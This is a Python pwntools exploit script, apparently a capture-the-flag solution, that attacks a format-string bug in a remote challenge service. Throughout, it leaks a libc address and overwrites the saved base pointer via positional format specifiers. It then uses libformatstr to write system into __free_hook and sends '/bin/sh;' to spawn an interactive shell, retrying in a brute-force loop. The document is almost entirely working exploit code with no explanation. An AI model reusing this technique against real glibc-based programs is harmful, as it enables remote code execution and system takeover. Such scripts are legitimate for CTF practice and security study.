from skel import *

me['r']['tube'] = lambda: remote(host='sandbox.tasks.ctf.codeblue.jp', port=6345)

def main():
    s = tube()

    sz = 0x2000

    payload = '%1$d' # trigger printf_positional
    payload += ' %p'*1800 # grow scratch_buffer

    payload += '%61c'
    payload += '%19165$hhn' # saved rbp to 0x58

    payload += ' %19094$p' # main_arena addr
    payload += ' %19165$p' # print saved rbp for brute check

    pay_len = p32(sz)
    s.sa('size of your message: ', pay_len)
    s.sla('message: ', payload[:u32(pay_len)])
    s.ru('Entered: ')

    data = s.ru('\n', drop=True).split(' ')
    print 'leaked %s', data[-2:]

    # wrong rbp address
    if data[-1][-2:] != '00':
        s.close()
        return False

    print 'rbp address matched'

    libc_leak = int(data[-2],16) # main_arena

    libc_bin = ELF('libc.so.6')
    libc_bin.address = libc_leak - 0x3c4b20

    freehook_addr = libc_bin.sym['__free_hook']
    system_addr = libc_bin.sym['system']

    print 'freehook', hex(freehook_addr)
    print 'system', hex(system_addr)

    from libformatstr import FormatStr

    f = FormatStr(isx64=1)
    f[freehook_addr] =  system_addr & 0xffffffff
    f[freehook_addr+4] = (system_addr >> 32)

    payload = '/bin/sh;' + f.payload(6, start_len=8)
    s.sa('size of your message: ', p32(len(payload)))
    s.sa('message: ', payload)
    s.ru('Entered: ')

    s.rr(1)

    s.interactive()

    return True

while True:
    try:
        if main():
            break
    except EOFError:
        pass
